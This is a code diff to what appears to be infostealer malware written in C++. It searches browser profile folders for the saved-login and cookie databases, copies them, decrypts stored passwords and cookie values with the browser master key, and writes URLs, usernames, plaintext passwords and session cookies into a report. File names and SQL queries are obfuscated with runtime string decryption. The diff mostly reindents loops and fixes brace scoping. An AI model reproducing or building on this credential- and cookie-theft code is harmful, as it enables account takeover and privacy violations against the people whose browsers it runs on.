@@ -202,7 +202,6 @@ namespace credential {
             }
 
             if (localState.empty() || !fs::exists(localState)) {
-                 // Try roaming if local didn't work (for some configurations)
                  if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
                      std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
                      if (fs::exists(altState)) localState = altState;
@@ -217,7 +216,6 @@ namespace credential {
             std::vector<BYTE> key = GetMasterKey(localState);
             if (key.empty()) report += "[!] No master key for " + browser.name + "\n";
 
-            // Search for Login Data in both local and roaming paths
             std::vector<std::string> searchPaths;
             if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
             if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);
@@ -225,59 +223,60 @@ namespace credential {
             for (const auto& searchPath : searchPaths) {
                 if (!fs::exists(searchPath)) continue;
                 try {
-                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
-                    try {
-                        const auto& entry = *it;
-                        if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, sizeof(kLoginDataEnc)/sizeof(kLoginDataEnc[0])))) {
-                            std::string loginData = entry.path().string();
-                            
-                            char tempPath[MAX_PATH];
-                            GetTempPathA(MAX_PATH, tempPath);
-                            std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
+                    for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
+                        try {
+                            const auto& entry = *it;
+                            if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, sizeof(kLoginDataEnc)/sizeof(kLoginDataEnc[0])))) {
+                                std::string loginData = entry.path().string();
 
-                            SafeCopyDatabase(loginData, tempDb);
+                                char tempPath[MAX_PATH];
+                                GetTempPathA(MAX_PATH, tempPath);
+                                std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
 
-                            sqlite3* db;
-                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, sizeof(kQueryLoginsEnc)/sizeof(kQueryLoginsEnc[0])));
-                                const char* query = query_str.c_str();
-                                sqlite3_stmt* stmt;
-                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
-                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
-                                        if (!url_ptr || !user_ptr) continue;
+                                SafeCopyDatabase(loginData, tempDb);
 
-                                        std::string url = url_ptr;
-                                        std::string username = user_ptr;
-                                        const void* blob = sqlite3_column_blob(stmt, 2);
-                                        int blobLen = sqlite3_column_bytes(stmt, 2);
-                                        
-                                        if (blobLen > 0) {
-                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
-                                            std::string password = DecryptPassword(encryptedPass, key);
+                                sqlite3* db;
+                                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, sizeof(kQueryLoginsEnc)/sizeof(kQueryLoginsEnc[0])));
+                                    const char* query = query_str.c_str();
+                                    sqlite3_stmt* stmt;
+                                    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                        while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                            const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
+                                            const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
+                                            if (!url_ptr || !user_ptr) continue;
 
-                                            if (!password.empty() && !username.empty()) {
-                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
+                                            std::string url = url_ptr;
+                                            std::string username = user_ptr;
+                                            const void* blob = sqlite3_column_blob(stmt, 2);
+                                            int blobLen = sqlite3_column_bytes(stmt, 2);
+
+                                            if (blobLen > 0) {
+                                                std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
+                                                std::string password = DecryptPassword(encryptedPass, key);
+
+                                                if (!password.empty() && !username.empty()) {
+                                                    report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
+                                                }
                                             }
                                         }
+                                        sqlite3_finalize(stmt);
                                     }
-                                    sqlite3_finalize(stmt);
-                                }
-                                sqlite3_close(db);
-                            } else {
-                                if (db) {
-                                    LOG_DEBUG("SQLite open failed for " + browser.name + ": " + std::string(sqlite3_errmsg(db)));
                                     sqlite3_close(db);
+                                } else {
+                                    if (db) {
+                                        LOG_DEBUG("SQLite open failed for " + browser.name + ": " + std::string(sqlite3_errmsg(db)));
+                                        sqlite3_close(db);
+                                    }
                                 }
+                                SafeDeleteDatabase(tempDb);
                             }
-                            SafeDeleteDatabase(tempDb);
-                        }
-                    } catch (...) {}
+                        } catch (...) {}
 
-                    if (it.depth() > 3) it.disable_recursion_pending();
-                }
-            } catch (...) {}
+                        if (it.depth() > 3) it.disable_recursion_pending();
+                    }
+                } catch (...) {}
+            }
         }
 
         if (impersonated) utils::RevertToSelf();
@@ -341,66 +340,67 @@ namespace credential {
             for (const auto& searchPath : searchPaths) {
                 if (!fs::exists(searchPath)) continue;
                 try {
-                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
-                    try {
-                        const auto& entry = *it;
-                        std::string filename = entry.path().filename().string();
+                    for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
+                        try {
+                            const auto& entry = *it;
+                            std::string filename = entry.path().filename().string();
 
-                        if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, sizeof(kCookiesEnc)/sizeof(kCookiesEnc[0])))) {
-                            std::string cookiesPath = entry.path().string();
+                            if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, sizeof(kCookiesEnc)/sizeof(kCookiesEnc[0])))) {
+                                std::string cookiesPath = entry.path().string();
 
-                            char tempPath[MAX_PATH];
-                            GetTempPathA(MAX_PATH, tempPath);
-                            std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
+                                char tempPath[MAX_PATH];
+                                GetTempPathA(MAX_PATH, tempPath);
+                                std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
 
-                            SafeCopyDatabase(cookiesPath, tempDb);
+                                SafeCopyDatabase(cookiesPath, tempDb);
 
-                            sqlite3* db;
-                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, sizeof(kQueryCookiesEnc)/sizeof(kQueryCookiesEnc[0])));
-                                const char* query = query_str.c_str();
-                                sqlite3_stmt* stmt;
-                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
-                                        const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
-                                        int isSecure = sqlite3_column_int(stmt, 2);
-                                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
-                                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
+                                sqlite3* db;
+                                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, sizeof(kQueryCookiesEnc)/sizeof(kQueryCookiesEnc[0])));
+                                    const char* query = query_str.c_str();
+                                    sqlite3_stmt* stmt;
+                                    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                        while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
+                                            const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
+                                            int isSecure = sqlite3_column_int(stmt, 2);
+                                            sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
+                                            const char* name = (const char*)sqlite3_column_text(stmt, 4);
 
-                                        const void* blob = sqlite3_column_blob(stmt, 5);
-                                        int blobLen = sqlite3_column_bytes(stmt, 5);
+                                            const void* blob = sqlite3_column_blob(stmt, 5);
+                                            int blobLen = sqlite3_column_bytes(stmt, 5);
 
-                                        if (blobLen > 0) {
-                                            std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
-                                            std::string value = DecryptPassword(encryptedVal, key);
+                                            if (blobLen > 0) {
+                                                std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
+                                                std::string value = DecryptPassword(encryptedVal, key);
 
-                                            if (!value.empty()) {
-                                                long long unixExpiry = (expiry / 1000000) - 11644473600LL;
-                                                if (unixExpiry < 0) unixExpiry = 0;
+                                                if (!value.empty()) {
+                                                    long long unixExpiry = (expiry / 1000000) - 11644473600LL;
+                                                    if (unixExpiry < 0) unixExpiry = 0;
 
-                                                resultSS << (host ? host : "") << "\t"
-                                                         << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
-                                                         << (cpath ? cpath : "") << "\t"
-                                                         << (isSecure ? "TRUE" : "FALSE") << "\t"
-                                                         << unixExpiry << "\t"
-                                                         << (name ? name : "") << "\t"
-                                                         << value << "\n";
-                                                cookieCount++;
+                                                    resultSS << (host ? host : "") << "\t"
+                                                             << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
+                                                             << (cpath ? cpath : "") << "\t"
+                                                             << (isSecure ? "TRUE" : "FALSE") << "\t"
+                                                             << unixExpiry << "\t"
+                                                             << (name ? name : "") << "\t"
+                                                             << value << "\n";
+                                                    cookieCount++;
+                                                }
                                             }
                                         }
+                                        sqlite3_finalize(stmt);
                                     }
-                                    sqlite3_finalize(stmt);
+                                    sqlite3_close(db);
                                 }
-                                sqlite3_close(db);
+                                SafeDeleteDatabase(tempDb);
                             }
-                            SafeDeleteDatabase(tempDb);
-                        }
-                    } catch (...) {}
+                        } catch (...) {}
 
-                    if (it.depth() > 3) it.disable_recursion_pending();
-                }
-            } catch (...) {}
+                        if (it.depth() > 3) it.disable_recursion_pending();
+                    }
+                } catch (...) {}
+            }
         }
 
         std::stringstream finalOut;
